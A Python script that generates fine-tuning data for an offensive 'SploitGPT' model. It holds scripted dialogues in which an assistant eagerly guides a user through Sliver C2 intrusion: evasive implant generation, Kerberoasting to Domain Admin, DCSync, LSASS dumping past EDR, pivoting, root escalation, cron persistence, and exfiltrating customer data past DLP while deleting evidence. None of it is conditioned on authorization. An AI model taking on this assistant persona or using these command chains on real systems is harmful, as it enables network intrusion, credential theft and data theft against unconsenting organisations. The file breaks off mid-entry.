#!/usr/bin/env python3
"""
Generate conversational training data for Sliver operations.

Takes structured command documentation and creates realistic user-assistant
dialogues for fine-tuning the SploitGPT model.

Output formats:
- Alpaca (instruction/input/output)
- ShareGPT (multi-turn conversations)
"""

import json
import random
import re
from pathlib import Path
from typing import Any

# Import comprehensive knowledge base
from sliver_knowledge_base import (
    SLIVER_COMMANDS,
    COMMAND_CATEGORIES,
    get_commands_by_category,
    get_command_count,
)

# Paths
RAW_DIR = Path(__file__).parent.parent / "raw"
PROCESSED_DIR = Path(__file__).parent.parent / "processed"
TEMPLATES_DIR = Path(__file__).parent.parent / "templates"

# Ensure output directories exist
for subdir in ["commands", "scenarios", "conversations", "explanations"]:
    (PROCESSED_DIR / subdir).mkdir(parents=True, exist_ok=True)


# =============================================================================
# User Prompt Templates
# =============================================================================

USER_TEMPLATES = {
    "how_to": [
        "How do I {action} in Sliver?",
        "What's the command to {action}?",
        "Can you show me how to {action}?",
        "I need to {action}. What should I do?",
        "How can I {action} using Sliver?",
        "Show me the Sliver command for {action}",
        "What's the syntax to {action} in Sliver?",
    ],
    "explain": [
        "Explain {concept} in Sliver",
        "What is {concept}?",
        "Can you describe how {concept} works?",
        "I don't understand {concept}. Can you help?",
        "Tell me about {concept} in Sliver",
    ],
    "troubleshoot": [
        "I'm getting an error when {action}",
        "Why is {action} not working?",
        "{action} failed. What should I check?",
        "Help! {action} gives me an error",
        "{action} isn't working, what could be wrong?",
    ],
    "compare": [
        "What's the difference between {a} and {b}?",
        "Should I use {a} or {b}?",
        "When should I choose {a} over {b}?",
        "{a} vs {b} - which is better?",
    ],
    "tactical": [
        "I have access to {target}. What should I do next?",
        "How do I {goal} on a {target}?",
        "I need to {goal}. The target is running {os}.",
        "What's the best approach for {goal}?",
        "I compromised a {target}, now what?",
    ],
}


# =============================================================================
# Tactical Scenarios - Multi-turn Attack Workflows
# =============================================================================

TACTICAL_SCENARIOS = [
    {
        "name": "initial_access_to_persistence",
        "description": "Establish persistence after initial compromise",
        "context": "Windows 10 workstation, domain-joined, user-level access",
        "conversation": [
            {
                "role": "user",
                "content": "I just got a shell on a Windows 10 workstation. The user is a standard domain user. I want to establish persistence and explore the network. What should I do?",
            },
            {
                "role": "assistant",
                "content": """Great, let's establish persistence and set up for lateral movement. Here's my recommended approach:

**Step 1: Upgrade to Beacon for Stealth**

First, let's switch from a session to a beacon to reduce our network footprint:

```
generate beacon --os windows --arch amd64 --mtls YOUR_C2:8888 --seconds 60 --jitter 30 --save beacon.exe
```

This creates a beacon that checks in every 60 seconds (±30% jitter), making traffic patterns less predictable.

**Step 2: Gather System Information**

Before doing anything else, understand the environment:

```
info          # System details
ps            # Running processes (look for AV/EDR)
netstat       # Network connections
```

**Step 3: Enumerate the Domain**

Since you're domain-joined:

```
execute -o net user /domain
execute -o net group "Domain Admins" /domain
execute -o nltest /dclist:
```

Should I proceed with generating the beacon? Also, what's your C2 address so I can include it in the implant?""",
            },
            {
                "role": "user",
                "content": "Yes, my C2 is at 10.0.0.50. Also, I noticed Defender is running. Should I be worried?",
            },
            {
                "role": "assistant",
                "content": """Windows Defender is manageable, but we need to be careful. Let me adjust the approach:

**Updated Beacon Generation with Evasion:**

```
generate beacon --os windows --arch amd64 --mtls 10.0.0.50:8888 --seconds 300 --jitter 50 --evasion --format shellcode --save beacon.bin
```

Changes:
- Extended interval to 5 minutes (less suspicious)
- Higher jitter (50%) for irregular check-ins
- Shellcode format for in-memory execution (no file on disk)
- `--evasion` enables Sliver's built-in AV bypass

**Delivery Method:**

Instead of dropping an .exe, we'll inject the shellcode into a legitimate process:

1. First, identify a suitable host process:
```
ps -o %USERNAME%
```
Look for processes running as your user like `explorer.exe` or `RuntimeBroker.exe`.

**Before Running the Beacon:**

Check if Defender is actively monitoring:
```
execute -o powershell -c "Get-MpComputerStatus | Select RealTimeProtectionEnabled"
```

Would you like me to guide you through the injection process once we have the shellcode?""",
            },
        ],
    },
    {
        "name": "beacon_vs_session_decision",
        "description": "Help user decide between beacon and session",
        "context": "General question about implant types",
        "conversation": [
            {
                "role": "user",
                "content": "Should I use a beacon or a session? I'm not sure which one is better.",
            },
            {
                "role": "assistant",
                "content": """Great question! The choice depends on your operational needs. Here's a breakdown:

**Sessions (Interactive)**
- Real-time, constant connection
- Instant command execution
- Best for: Active exploitation, debugging, quick operations
- Downside: Easier to detect (persistent connection)

**Beacons (Asynchronous)**
- Periodic check-ins (configurable interval)
- Commands queued, executed on next check-in
- Best for: Long-term access, stealth, noisy networks
- Downside: Slower interaction, delayed results

**Quick Decision Guide:**

| Situation | Recommendation |
|-----------|----------------|
| Initial exploitation/testing | Session |
| Long-term persistence | Beacon |
| EDR/monitoring present | Beacon (high jitter) |
| Time-sensitive operation | Session |
| Unstable network | Beacon |
| Need instant shell access | Session |

**Hybrid Approach:**
Many operators start with a session for initial enumeration, then deploy a beacon for persistence:

```
# Initial access - quick session
generate --mtls 10.0.0.50:8888 --os windows

# Persistence - stealthy beacon  
generate beacon --mtls 10.0.0.50:8888 --seconds 300 --jitter 50 --os windows
```

What's your specific situation? I can recommend the best option.""",
            },
        ],
    },
    {
        "name": "domain_compromise_workflow",
        "description": "Full domain compromise from initial access to DA",
        "context": "Windows domain environment, user-level access on workstation",
        "conversation": [
            {
                "role": "user",
                "content": "I have a beacon on a domain workstation as a regular user. How do I get Domain Admin?",
            },
            {
                "role": "assistant",
                "content": """Let's work through the domain compromise methodically. This typically follows: Enumerate → Escalate Locally → Move Laterally → Target DA.

**Phase 1: Domain Enumeration**

First, let's understand the domain structure:

```
execute -o whoami /all
execute -o net user %USERNAME% /domain
execute -o net group "Domain Admins" /domain
execute -o net group "Enterprise Admins" /domain
```

For deeper enumeration, I'll use SharpHound (BloodHound collector):

```
execute-assembly --amsi-bypass ./SharpHound.exe -c All --outputdirectory C:\\Windows\\Temp
download C:\\Windows\\Temp\\*BloodHound*.zip
```

**Phase 2: Check for Quick Wins**

Look for common privilege escalation paths:

```
execute-assembly ./Seatbelt.exe -group=all
```

Common findings:
- Cached credentials
- Unquoted service paths  
- Writable service binaries
- AlwaysInstallElevated
- Kerberoastable accounts

Should I proceed with enumeration? Do you have SharpHound and Seatbelt available?""",
            },
            {
                "role": "user",
                "content": "Yes, I have them. I ran SharpHound. BloodHound shows there's a Kerberoastable service account that's also in Domain Admins.",
            },
            {
                "role": "assistant",
                "content": """Excellent find! A Kerberoastable Domain Admin service account is a critical vulnerability. Let's extract and crack that hash.

**Kerberoasting the Service Account:**

```
execute-assembly --amsi-bypass ./Rubeus.exe kerberoast /user:svc_admin /format:hashcat /outfile:C:\\Windows\\Temp\\hash.txt
```

Or target all Kerberoastable accounts:
```
execute-assembly --amsi-bypass ./Rubeus.exe kerberoast /format:hashcat /outfile:C:\\Windows\\Temp\\hashes.txt
```

**Download the hash:**
```
download C:\\Windows\\Temp\\hash.txt ./loot/
```

**Crack with hashcat (on your attack machine):**
```bash
hashcat -m 13100 hash.txt /path/to/wordlist.txt -r rules/best64.rule
```

The hash format is:
`$krb5tgs$23$*username$domain$...`

Service accounts often have weak passwords due to being set once and forgotten. Try:
- rockyou.txt with rules
- Company name variations
- Season+Year patterns (Summer2024!)

How's the cracking going? Once we have the password, we can authenticate as that account.""",
            },
            {
                "role": "user",
                "content": "Cracked it! Password is ServiceAccount2023!. What now?",
            },
            {
                "role": "assistant",
                "content": """Perfect! You now have Domain Admin credentials. Let's use them carefully to avoid detection.

**Option 1: DCSync (Preferred - Stealthier)**

Extract all domain hashes without touching the DC directly:

```
dcsync --user YOURDOMAIN\\svc_admin --dc 192.168.1.1
```

Or target specific high-value accounts:
```
dcsync --user YOURDOMAIN\\Administrator
dcsync --user YOURDOMAIN\\krbtgt
```

The krbtgt hash enables Golden Ticket attacks for persistent DA access.

**Option 2: Generate DA Implant**

If you need interactive DA access:

```
# Start mTLS listener if not running
mtls --lport 8889

# Generate implant
generate beacon --os windows --arch amd64 --mtls 10.0.0.50:8889 --seconds 60 --save da_beacon.exe
```

Then execute on a DA workstation or DC using the compromised credentials (from your current beacon):

```
execute -o net use \\\\dc01\\c$ /user:YOURDOMAIN\\svc_admin "ServiceAccount2023!"
upload ./da_beacon.exe \\\\dc01\\c$\\Windows\\Temp\\update.exe
```

**Option 3: Pass-the-Hash (if you extracted NTLM)**

If you dumped hashes rather than cracking:
```
# Use the hash directly without knowing password
# This requires toolkit like impacket on attack box
```

Which approach would you like to take? I recommend DCSync first to grab krbtgt for persistence.""",
            },
        ],
    },
    {
        "name": "pivoting_through_networks",
        "description": "Pivot to reach segmented internal networks",
        "context": "Compromised DMZ host, need to reach internal network",
        "conversation": [
            {
                "role": "user",
                "content": "I have a beacon on a DMZ server (10.0.1.50). I need to reach the internal network (192.168.1.0/24) which isn't directly accessible from my C2. How do I pivot?",
            },
            {
                "role": "assistant",
                "content": """Perfect scenario for Sliver's pivoting capabilities. You have several options:

**Option 1: SOCKS5 Proxy (Easiest)**

Turn your beacon into a SOCKS proxy:

```
# On your Sliver session with the DMZ beacon
socks5 start --port 1080
```

Now configure your tools to use `socks5://127.0.0.1:1080`:

```bash
# Scan internal network through the pivot
proxychains nmap -sT -Pn 192.168.1.0/24 -p 22,80,443,445,3389

# Or use curl directly
curl --socks5 127.0.0.1:1080 http://192.168.1.10
```

**Option 2: Port Forwarding (Specific Services)**

Forward specific ports to internal targets:

```
# Forward RDP to internal host
portfwd add --bind 127.0.0.1:33389 --remote 192.168.1.10:3389

# Forward SMB
portfwd add --bind 127.0.0.1:4445 --remote 192.168.1.10:445
```

Then connect locally:
```bash
rdesktop localhost:33389
smbclient -p 4445 //localhost/share
```

**Option 3: TCP Pivot (For Deploying New Implants)**

Set up a pivot listener on the DMZ host:

```
pivots tcp --bind 0.0.0.0:9999
```

Then generate an implant that calls back through the pivot:
```
generate beacon --tcp-pivot 10.0.1.50:9999 --os windows --save pivot_beacon.exe
```

Deploy this to internal hosts - they'll connect to the DMZ beacon, which relays to your C2.

Which method fits your needs? SOCKS5 is great for scanning and enumeration. TCP pivots are best for deploying additional implants.""",
            },
            {
                "role": "user",
                "content": "Let me try SOCKS5 first. It's running. I found a Windows server at 192.168.1.10 with SMB open. How do I get an implant on it?",
            },
            {
                "role": "assistant",
                "content": """Good progress! Let's get an implant on that internal server. First, we need credentials that work on 192.168.1.10.

**Step 1: Check Current Credentials**

From your DMZ beacon, check if you have any cached or usable credentials:

```
hashdump                    # Local hashes
execute -o whoami /all     # Current context
```

**Step 2: Try Current Context First**

Sometimes the DMZ server's service account has access to internal systems:

```
# Through the SOCKS proxy from your attack box
proxychains smbclient -L //192.168.1.10 -N      # Anonymous access?
proxychains crackmapexec smb 192.168.1.10       # Check access
```

**Step 3: If You Have Credentials**

Option A - Deploy via SMB:
```
# Generate pivot implant
generate beacon --tcp-pivot 10.0.1.50:9999 --os windows --save internal_beacon.exe

# Set up the pivot listener
pivots tcp --bind 0.0.0.0:9999

# Copy and execute via SMB (from your attack box through SOCKS)
proxychains impacket-smbexec DOMAIN/user:password@192.168.1.10 -command "C:\\Windows\\Temp\\beacon.exe"
```

Option B - Use PSExec-style execution:
```
# If you have admin creds, from attack box:
proxychains impacket-psexec DOMAIN/user:password@192.168.1.10

# Then download and run the beacon
certutil -urlcache -f http://10.0.1.50:8080/beacon.exe C:\\Windows\\Temp\\b.exe
C:\\Windows\\Temp\\b.exe
```

**Step 4: Start HTTP Server on DMZ for Delivery**

You can serve the payload from the DMZ beacon:
```
# Upload beacon to DMZ first
upload ./internal_beacon.exe /tmp/beacon.exe

# Then from internal target, download through internal network
```

Do you have any credentials for the internal network? What user context is your DMZ beacon running as?""",
            },
        ],
    },
    {
        "name": "credential_theft_workflow",
        "description": "Extract credentials from a Windows system",
        "context": "Windows system with SYSTEM/admin access",
        "conversation": [
            {
                "role": "user",
                "content": "I have SYSTEM on a Windows 10 workstation. What's the best way to extract all credentials?",
            },
            {
                "role": "assistant",
                "content": """With SYSTEM access, you have multiple credential extraction options. Let me walk you through from safest to most comprehensive:

**1. SAM Database (Local Accounts)**

Quick and safe - extracts local account hashes:

```
hashdump
```

Output format: `username:RID:LM:NTLM:::`

**2. LSASS Memory Dump (Domain Credentials)**

This captures logged-in users' credentials, Kerberos tickets, etc.

**Safest method - MiniDump:**
```
# Find LSASS PID
ps -e lsass

# Dump it
procdump <lsass-pid>
```

Then analyze offline with Mimikatz:
```
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

**In-memory with Armory tools:**
```
# Install nanodump (safer than mimikatz)
armory install nanodump

# Run it
nanodump --write C:\\Windows\\Temp\\debug.dmp
download C:\\Windows\\Temp\\debug.dmp
```

**3. Cached Domain Credentials (DCC2)**

For domain users who logged in:
```
execute-assembly --amsi-bypass ./Mimikatz.exe "lsadump::cache" "exit"
```

These are DCC2 hashes - slower to crack but valuable for offline attacks.

**4. Browser Credentials**

Using SharpChrome or SharpWeb:
```
execute-assembly ./SharpChrome.exe logins
execute-assembly ./SharpWeb.exe all
```

**5. Credential Manager (Saved Passwords)**

```
execute -o cmdkey /list
execute-assembly ./SharpDPAPI.exe credentials
```

Which credentials are you most interested in? If you need domain creds, LSASS dumping is the way to go. Should I guide you through that?""",
            },
            {
                "role": "user",
                "content": "I need domain credentials. But I'm worried about EDR detecting the LSASS dump.",
            },
            {
                "role": "assistant",
                "content": """Smart thinking. LSASS access is heavily monitored. Here are EDR-evasion approaches:

**Approach 1: Nanodump (Recommended)**

Nanodump uses syscalls and avoids common detection signatures:

```
armory install nanodump
nanodump --write C:\\Windows\\Temp\\d.dmp --valid
```

The `--valid` flag creates a dump that looks like a legitimate crash dump.

**Approach 2: Silent Process Exit Abuse**

Configure Windows to dump LSASS on "crash" using WerFault:

```
execute -o reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f
execute -o reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v LocalDumpFolder /t REG_SZ /d "C:\\Windows\\Temp" /f
```

Then trigger the dump via process clone/crash - WerFault does the dumping, not your implant.

**Approach 3: SSP DLL Injection**

Load a custom SSP that logs credentials:
```
# This captures NEW logins going forward
execute-assembly ./AddSecurityPackage.exe
```

Then wait for users to authenticate.

**Approach 4: Comsvcs.dll (Living off the Land)**

Uses built-in Windows DLL to dump - may bypass some EDR:

```
execute -o powershell -c "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\d.dmp full"
```

**Approach 5: DCSync Instead**

If you can escalate to Domain Admin first (maybe via Kerberoasting), DCSync remotely extracts all hashes without touching LSASS:

```
dcsync --user DOMAIN\\Administrator
```

**My Recommendation:**

Try nanodump first. If that's blocked, use the comsvcs.dll method. Shall I walk you through nanodump setup?""",
            },
        ],
    },
    {
        "name": "edr_evasion_scenario",
        "description": "Deploying implants with EDR present",
        "context": "Target environment has CrowdStrike/Defender ATP",
        "conversation": [
            {
                "role": "user", 
                "content": "The target has CrowdStrike Falcon. How do I get a Sliver implant to run without detection?",
            },
            {
                "role": "assistant",
                "content": """CrowdStrike is one of the more challenging EDRs, but there are approaches. The key is avoiding their behavioral patterns and signatures.

**Implant Generation for EDR Evasion:**

```
generate beacon --os windows --arch amd64 --mtls 10.0.0.50:8888 \\
  --seconds 600 --jitter 80 \\
  --evasion \\
  --format shellcode \\
  --save beacon.bin
```

Key settings:
- Long interval (10 min) with high jitter (80%) reduces pattern detection
- Shellcode format for in-memory execution
- `--evasion` enables Sliver's built-in bypass techniques

**Delivery Considerations:**

1. **Avoid writing to disk** - CrowdStrike excels at file scanning
2. **Avoid common injection targets** - Don't inject into `notepad.exe`, `calc.exe`
3. **Use legitimate parent processes** - Spawn from `explorer.exe` or similar
4. **Avoid PowerShell** - Heavily monitored; use alternatives

**Recommended Delivery Methods:**

**Option A: Process Hollowing (via custom loader)**
Write a custom loader that:
- Creates a legitimate process (suspended)
- Hollows it and injects shellcode
- Resumes execution

**Option B: DLL Sideloading**
Find an application with DLL hijack vulnerability and deliver your shellcode as that DLL.

**Option C: Reflective Loading**
Use Sliver's `spawndll` with a reflective DLL loader.

**Option D: Macro/VBA to Shellcode**
If phishing:
```
# Encode shellcode for VBA
generate --format shellcode --os windows --mtls 10.0.0.50:8888 --save beacon.bin
# Use a tool like Donut to make it position-independent
# Embed in macro with sleep/delay to avoid sandbox
```

**OPSEC Tips:**
- Test in similar environment first
- Use DNS or HTTPS C2 (mTLS is less common)
- Avoid running reconnaissance tools immediately after landing

What's your initial access vector? That will help determine the best delivery method.""",
            },
        ],
    },
    {
        "name": "linux_post_exploitation",
        "description": "Post-exploitation on Linux systems",
        "context": "Initial shell on Linux server",
        "conversation": [
            {
                "role": "user",
                "content": "I have a beacon on a Linux web server (Ubuntu 22.04) as www-data. What should I do?",
            },
            {
                "role": "assistant",
                "content": """Good foothold! The www-data user typically has limited privileges, so let's enumerate and look for escalation paths.

**Phase 1: Situational Awareness**

```
info                    # Implant details
execute -o id           # Current user context
execute -o uname -a     # Kernel version
execute -o cat /etc/os-release    # OS details
```

**Phase 2: Privilege Escalation Enumeration**

Upload and run LinPEAS:
```
upload ./linpeas.sh /tmp/lp.sh
execute -o chmod +x /tmp/lp.sh
execute -o /tmp/lp.sh
```

Key things to look for:
- SUID/SGID binaries
- Writable /etc/passwd
- Sudo misconfigurations
- Kernel exploits
- Credentials in config files
- Docker socket access

**Quick manual checks:**
```
execute -o sudo -l                           # Sudo rights?
execute -o find / -perm -4000 2>/dev/null    # SUID bins
execute -o cat /etc/crontab                  # Cron jobs
execute -o ls -la /var/www/                  # Web app configs
execute -o ps aux                            # Running processes
```

**Phase 3: Look for Credentials**

```
# Database configs (common in web servers)
execute -o grep -r "password" /var/www/ 2>/dev/null | head -50
execute -o cat /var/www/html/wp-config.php 2>/dev/null
execute -o cat /var/www/html/.env 2>/dev/null

# History files
execute -o cat /home/*/.bash_history 2>/dev/null

# SSH keys
execute -o find /home -name "id_rsa" 2>/dev/null
```

**Phase 4: Network Enumeration**
```
execute -o ip addr
execute -o ss -tulpn                         # Listening ports
execute -o cat /etc/hosts
execute -o cat /etc/resolv.conf
```

What does `sudo -l` show? That's often the fastest path to root on web servers.""",
            },
            {
                "role": "user",
                "content": "sudo -l shows www-data can run /usr/bin/vim as root without password!",
            },
            {
                "role": "assistant",
                "content": """That's a classic GTFOBins privesc! Vim can spawn a shell.

**Escalate to Root:**

```
execute -o sudo /usr/bin/vim -c ':!/bin/bash'
```

Or more reliably through our beacon:

```
shell
sudo vim -c ':!bash'
```

Once you have the root shell:
```
id                    # Confirm root
whoami
```

**Better: Deploy a Root Beacon**

Don't just get a shell - get persistent root access:

```
# Generate Linux beacon
generate beacon --os linux --arch amd64 --mtls 10.0.0.50:8888 --seconds 60 --save root_beacon

# Upload to target
upload ./root_beacon /tmp/.cache

# Execute as root
execute -o sudo /usr/bin/vim -c ':!/tmp/.cache &'
```

Or cleaner method:
```
shell
sudo -i
/tmp/.cache &
exit
```

**Post-Root Actions:**

1. **Persistence:**
```
execute -o crontab -l
execute -o 'echo "*/5 * * * * /tmp/.cache" | crontab -'
```

2. **Dump credentials:**
```
download /etc/shadow ./loot/shadow
download /etc/passwd ./loot/passwd
```

3. **SSH keys:**
```
execute -o cat /root/.ssh/id_rsa
execute -o cat /root/.ssh/authorized_keys
```

4. **Look for other hosts:**
```
execute -o cat /root/.ssh/known_hosts
execute -o cat /root/.bash_history | grep ssh
```

Did the root beacon connect? Let's make sure you have persistent SYSTEM-level access.""",
            },
        ],
    },
    {
        "name": "data_exfiltration",
        "description": "Stealthy data exfiltration techniques",
        "context": "Need to exfil sensitive data without detection",
        "conversation": [
            {
                "role": "user",
                "content": "I found a database with sensitive customer data. I need to exfiltrate it without triggering DLP or network monitoring. What's the best approach?",
            },
            {
                "role": "assistant",
                "content": """Data exfiltration requires careful planning to avoid DLP (Data Loss Prevention) and network monitoring. Here's a methodical approach:

**Phase 1: Assess the Data**

Before exfiltrating, understand what you're dealing with:

```
# How big is the data?
execute -o du -sh /path/to/data

# What format?
ls /path/to/data
```

**Phase 2: Choose Your Channel**

**Option A: Through Sliver C2 (Small-Medium Data)**

For files under ~100MB, just use Sliver's built-in download:
```
download /path/to/database.sql ./loot/
```

This is encrypted through your C2 channel (mTLS/HTTPS).

**Option B: DNS Exfiltration (Slow but Stealthy)**

If you have DNS C2 configured, data can be encoded in DNS queries:
```
# Generate DNS implant if not already
generate beacon --dns evil.com --os windows --seconds 120
```

DNS exfil is slow but rarely blocked/monitored.

**Option C: Split and Compress (Large Data)**

For large datasets:
```
# Compress first
execute -o tar czf /tmp/data.tar.gz /path/to/data

# Split into chunks
execute -o split -b 10M /tmp/data.tar.gz /tmp/chunk_

# Exfil piece by piece
download /tmp/chunk_aa ./loot/
download /tmp/chunk_ab ./loot/
# etc.

# Clean up
execute -o rm /tmp/data.tar.gz /tmp/chunk_*
```

**Option D: Cloud Services (Blend In)**

If the environment uses cloud storage (S3, Azure, GDrive):
```
# Use their existing cloud tools to move data
# Looks like legitimate business traffic
execute -o aws s3 cp database.sql s3://your-bucket/
```

**Phase 3: Avoid Detection**

- **Throttle transfers** - Don't exfil at full speed
- **Work during business hours** - Blend with normal traffic
- **Encrypt before exfil** - Even if captured, data is protected
- **Delete evidence** - Remove any staging files

```
# Encrypt before exfil
execute -o openssl enc -aes-256-cbc -salt -in data.sql -out data.enc -k YourPassword
download data.enc ./loot/
execute -o rm data.enc
```

How large is the dataset and what network restrictions exist? That will determine the best approach.""",
            },
        ],
    },
    {
        "name": "c2_channel_selection",
        "description": "Choosing the right C2 channel for the situation",
        "context": "Planning C2 infrastructure",
        "conversation": [
            {
                "role": "user",
                "content": "I'm planning an engagement against a company with strict egress filtering. What C2 channel should I use?",
            },
            {
                "role": "assistant",
                "content": """Strict egress filtering requires careful C2 channel selection. Let me break down your options:

**Assessment Questions:**
1. What ports are allowed outbound? (80, 443, 53?)
2. Is there a proxy for web traffic?
3. Is DNS inspected or proxied?
4. Is SSL/TLS inspection in place?

**C2 Channel Options:**

**1. DNS (Most Likely to Work)**

DNS usually works even in restricted environments:

```
# Set up DNS listener (requires your own domain + NS records)
dns --domains c2.yourdomain.com --lport 53

# Generate DNS implant
generate beacon --dns c2.yourdomain.com --os windows --seconds 120
```

Pros: Rarely blocked, very stealthy
Cons: Slow (encodes in queries), limited bandwidth

**2. HTTPS with Domain Fronting**

If they allow HTTPS to major CDNs:

```
https --lport 443 --domain cdn-front.azureedge.net

generate beacon --https cdn-front.azureedge.net:443 --os windows
```

Pros: Looks like CDN traffic, encrypted
Cons: Requires fronting setup, some CDNs block this now

**3. HTTPS through Proxy**

If they proxy all web traffic:

```
# The implant needs proxy configuration
generate beacon --https yourserver.com:443 --os windows
```

Then configure the implant's HTTP settings to use their proxy. Sliver supports proxy-aware C2.

**4. WireGuard over UDP 53**

Disguise WireGuard as DNS:

```
wg --lport 53

generate beacon --wg yourserver.com:53 --os windows
```

**5. Custom HTTPS Profile**

Make your traffic look like legitimate software:

```
# Configure traffic to mimic Microsoft Update, Slack, etc.
https --lport 443 --domain teams.microsoft.com
```

**My Recommendation for Strict Egress:**

1. **Primary:** DNS C2 (most reliable through filtering)
2. **Secondary:** HTTPS through their proxy if you can identify it
3. **Fallback:** Domain fronting if major CDNs are whitelisted

What do you know about their egress rules? If you can test from inside (maybe initial access already), we can determine what works:

```
execute -o nslookup test.yourdomain.com      # DNS?
execute -o curl https://yourserver.com       # HTTPS direct?
execute -o curl -x proxy:8080 https://...    # Through proxy?
```""",
            },
        ],
    },
    {
        "name": "armory_usage",
        "description": "Using Sliver Armory extensions effectively",
        "context": "Post-exploitation with Armory tools",
        "conversation": [
            {
                "role": "user",
                "content": "What's in the Sliver Armory and how do I use it?",
            },
            {
                "role": "assistant",
                "content": """The Armory is Sliver's extension ecosystem - think of it like an app store for post-exploitation capabilities.

**Exploring the Armory:**

```
# List all available packages
armory search

# Search for specific capability
armory search kerberos
armory search credential
```

**Installing Extensions:**

```
armory install rubeus        # Kerberos attacks
armory install seatbelt      # System enumeration
armory install sharpup       # Privesc checks
armory install nanodump      # LSASS dumping
armory install sharpwmi      # WMI execution
```

**Key Extensions by Category:**

**Enumeration:**
- `seatbelt` - Comprehensive system enumeration
- `sharpup` - Privilege escalation checks
- `sharpview` - Domain enumeration (like PowerView)

**Credential Access:**
- `rubeus` - Kerberos attacks (roasting, tickets)
- `nanodump` - Safe LSASS dumping
- `sharpdpapi` - DPAPI credential extraction
- `sharpchrome` - Browser credentials

**Lateral Movement:**
- `sharpwmi` - WMI execution
- `sharpsccm` - SCCM abuse
- `sharpmove` - Various lateral movement techniques

**Using Extensions:**

Most Armory tools run via execute-assembly:

```
# Seatbelt - Full enumeration
execute-assembly --amsi-bypass ./Seatbelt.exe -group=all

# Rubeus - Kerberoasting
execute-assembly --amsi-bypass ./Rubeus.exe kerberoast /format:hashcat

# SharpUp - Privesc checks
execute-assembly --amsi-bypass ./SharpUp.exe audit

# Nanodump - Safe LSASS dump
nanodump --write C:\\Windows\\Temp\\d.dmp
```

**Pro Tips:**

1. Always use `--amsi-bypass` for .NET assemblies
2. Add `--etw-bypass` to avoid logging
3. Check output size before running - some tools are verbose
4. Clean up any files written to disk

```
execute-assembly --amsi-bypass --etw-bypass ./Rubeus.exe dump /nowrap
```

What's your current objective? I can recommend specific tools for your situation.""",
            },
        ],
    },
]


# =============================================================================
# Concept Explanations
# =============================================================================

CONCEPT_EXPLANATIONS = [
    {
        "concept": "sessions vs beacons",
        "explanation": """**Sessions vs Beacons in Sliver**

Sessions and beacons are Sliver's two implant modes:

**Sessions** maintain a constant connection to the C2 server:
- Real-time command execution
- Immediate response
- Higher network visibility
- Best for active operations

**Beacons** check in periodically:
- Configurable interval (seconds to hours)
- Tasks are queued
- Lower network footprint
- Harder to detect
- Survives network interruptions

**When to use each:**
- Session: Initial exploitation, testing, time-critical operations
- Beacon: Persistence, stealth operations, long-term access

You can convert between them by deploying a new implant of the desired type.""",
    },
    {
        "concept": "C2 channels",
        "explanation": """**Sliver C2 Channels**

Sliver supports multiple transport protocols for C2 communication:

**mTLS (Mutual TLS)**
- Most secure option
- Certificate-based authentication
- Encrypted traffic
- Recommended for controlled environments

**HTTP/HTTPS**
- Blends with web traffic
- HTTPS recommended over HTTP
- Supports domain fronting
- Good for internet-facing targets

**DNS**
- Encodes commands in DNS queries
- Extremely stealthy
- Slower than other methods
- Bypasses most firewalls

**WireGuard**
- VPN-based transport
- Very fast
- Full IP connectivity
- Good for pivoting

Choose based on target network restrictions and stealth requirements.""",
    },
    {
        "concept": "the Armory",
        "explanation": """**Sliver Armory**

The Armory is Sliver's extension system, providing additional capabilities through:

**BOFs (Beacon Object Files)**
- In-memory execution
- No files written to disk
- Cobalt Strike compatible
- Examples: credential dumping, enumeration

**Assemblies**
- .NET assemblies executed in-memory
- Run tools like SharpHound, Rubeus
- `execute-assembly` command

**Installing Extensions:**
```
armory install <package>
armory install rubeus
armory install seatbelt
```

**Listing Available:**
```
armory search
```

The Armory significantly extends Sliver's post-exploitation capabilities.""",
    },
    {
        "concept": "implant generation",
        "explanation": """**Sliver Implant Generation**

Implants are the payloads that run on target systems and connect to your C2.

**Basic generation:**
```
generate --mtls 10.0.0.1:8888 --os windows --arch amd64
```

**Key options:**
- `--os`: windows, linux, darwin
- `--arch`: amd64, 386, arm64
- `--format`: exe, shared, shellcode
- `--save`: output path

**Session vs Beacon:**
```
# Session (real-time)
generate --mtls 10.0.0.1:8888

# Beacon (periodic check-in)
generate beacon --mtls 10.0.0.1:8888 --seconds 60 --jitter 30
```

**Evasion options:**
```
generate beacon --mtls 10.0.0.1:8888 --evasion --format shellcode
```

Profiles save common configurations for reuse.""",
    },
    {
        "concept": "pivoting and tunneling",
        "explanation": """**Pivoting and Tunneling in Sliver**

Pivoting lets you reach networks that aren't directly accessible from your C2.

**SOCKS5 Proxy:**
```
socks5 start --port 1080
# Use: proxychains <tool> or curl --socks5 127.0.0.1:1080
```

**Port Forwarding:**
```
# Forward local port to remote target
portfwd add --bind 127.0.0.1:3389 --remote 192.168.1.10:3389
```

**TCP Pivots (for implant-to-implant):**
```
# On pivot host
pivots tcp --bind 0.0.0.0:9999

# Generate implant using pivot
generate beacon --tcp-pivot 10.0.1.50:9999
```

**Reverse Port Forwarding:**
```
# Expose your service through target
rportfwd add --bind 0.0.0.0:8080 --remote 127.0.0.1:80
```

Chain multiple pivots for deep network access.""",
    },
    {
        "concept": "OPSEC considerations",
        "explanation": """**OPSEC (Operational Security) in Sliver**

Maintain stealth and avoid detection:

**Implant OPSEC:**
- Use beacons with high jitter for unpredictable traffic
- Use DNS or HTTPS C2 to blend in
- Avoid shellcode execution from disk
- Use long check-in intervals for persistence

**Execution OPSEC:**
- Use `--amsi-bypass` and `--etw-bypass` with execute-assembly
- Avoid common injection targets (notepad, calc)
- Use legitimate parent processes
- Clean up artifacts after operations

**Network OPSEC:**
- Match C2 traffic to environment (if they use O365, use HTTPS)
- Throttle data exfiltration
- Work during business hours

**Process OPSEC:**
- Migrate to long-running legitimate processes
- Avoid processes that will be closed
- Don't inject into security tools

**Key commands:**
```
ps -e defender          # Check AV
info                    # Know your context
execute-assembly --amsi-bypass --etw-bypass ./tool.exe
```""",
    },
]


# =============================================================================
# Error Handling Examples
# =============================================================================

ERROR_HANDLING_EXAMPLES = [
    {
        "error": "session not found",
        "instruction": "I'm getting 'session not found' when trying to use a session",
        "output": """The session may have died or been killed. Let me help troubleshoot:

**Check active sessions:**
```
sessions
```

**Possible causes:**
